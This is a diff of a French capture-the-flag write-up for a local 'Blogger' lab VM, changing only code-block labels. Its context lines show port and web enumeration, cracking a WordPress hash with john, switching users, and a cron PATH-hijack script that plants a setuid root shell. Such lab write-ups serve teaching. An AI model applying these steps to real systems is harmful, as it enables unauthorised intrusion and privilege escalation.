@@ -10,7 +10,7 @@ Sans ça l'importation ne fonctionne pas ou au mieux vous aurez des messages de 
 
 ## Enumération
 
-```shellsession
+```bash
 $ sudo nmap -T5 -p- -sCV 192.168.56.41
 [sudo] Mot de passe de root : 
 Starting Nmap 7.93 ( https://nmap.org )
@@ -32,7 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Le site sur le port 80 est une espèce de coquille vide avec la plupart des liens ne menant nul part. On peut lancer Wapiti avec une liste de modules vide et en mode verbeux pour voir la liste des resources trouvées par le crawler :
 
-```shellsession
+```bash
 $ wapiti -u http://192.168.56.41/ --color  -m "" --flush-session -v2
 ujson module not found, using json
 
@@ -64,7 +64,7 @@ Le seul formulaire effectif trouvé correspond à la possibilité de poster un c
 
 J'ai lancé un feroxbuster avec la commande suivante :
 
-```shellsession
+```bash
 $ feroxbuster -u http://blogger.thm/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 ```
 
@@ -172,7 +172,7 @@ MariaDB [wordpress]> select * from wp_users;
 
 Je vois dans /home/james que l'utilisateur dispose d'un flag mais ce dernier n'est pas lisible par tous. Il faut certainement casser le hash wordpress. Je me lance donc sur cette tache :
 
-```shellsession
+```bash
 $ ./john --format=phpass --wordlist=rockyou.txt hashes.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
@@ -209,7 +209,7 @@ Il apparait qu'on peut se connecter avec *vagrant* en utilisant le mot de passe 
 
 L'utilisateur a ensuite les droits pour passer root :
 
-```shellsession
+```bash
 www-data@ubuntu-xenial:/$ su vagrant
 Password: 
 vagrant@ubuntu-xenial:/$ id
@@ -244,7 +244,7 @@ flag{W311_D0n3_Y0u_P3n3tr4t3d_M3 :)}
 
 Pour faire le chemin depuis james on peut exploiter le fait que le dossier personnel de l'utilisateur est en premier de l'ordre de path spécifié dans la crontab :
 
-```shellsession
+```bash
 james@ubuntu-xenial:~$ cat privesc.sh 
 #!/bin/sh
 cp /bin/sh /tmp/rootshell
@@ -254,7 +254,7 @@ james@ubuntu-xenial:~$ cp privesc.sh tar
 
 On attend un peu et BOUM on a notre shell avec euid root :
 
-```shellsession
+```bash
 james@ubuntu-xenial:~$ /tmp/rootshell -p
 # id
 uid=1002(james) gid=1002(james) euid=0(root) groups=1002(james)
